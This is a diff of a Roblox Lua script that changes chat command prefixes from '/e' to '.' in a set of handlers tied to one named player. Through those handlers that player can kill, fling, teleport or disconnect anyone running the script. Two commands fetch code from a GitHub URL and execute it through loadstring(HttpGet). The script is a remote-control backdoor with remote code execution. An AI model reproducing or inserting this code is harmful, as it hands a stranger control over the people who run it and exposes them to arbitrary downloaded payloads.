@@ -1,25 +1,25 @@
 
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == "/e kill" then
+if Message:lower() == ".kill" then
 game.Players.LocalPlayer.Character.Humanoid.Health = 0
 end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == "/e fling" then
+if Message:lower() == ".fling" then
 game:getService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2722238.6643066406, 4862221.3525390625, -27222274.0993652344)
 end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == "/e bring" then
+if Message:lower() == ".bring" then
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.zzotac.Character.HumanoidRootPart.CFrame
 end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == "/e sound" then
+if Message:lower() == ".sound" then
 
  local hi = Instance.new("Sound")
 hi.Name = "Sound"
@@ -36,25 +36,25 @@ end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == "/e kick" then
+if Message:lower() == ".kick" then
 game:Shutdown()
 end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == "/e troll" then
+if Message:lower() == ".troll" then
 loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/shrek'))()
 end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == "/e troll2" then
+if Message:lower() == ".troll2" then
 loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/1x1x1'))()
 end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == "/e rj" then
+if Message:lower() == ".rj" then
 local ts = game:GetService("TeleportService")
 local p = game:GetService("Players").LocalPlayer
 ts:Teleport(game.PlaceId, p)
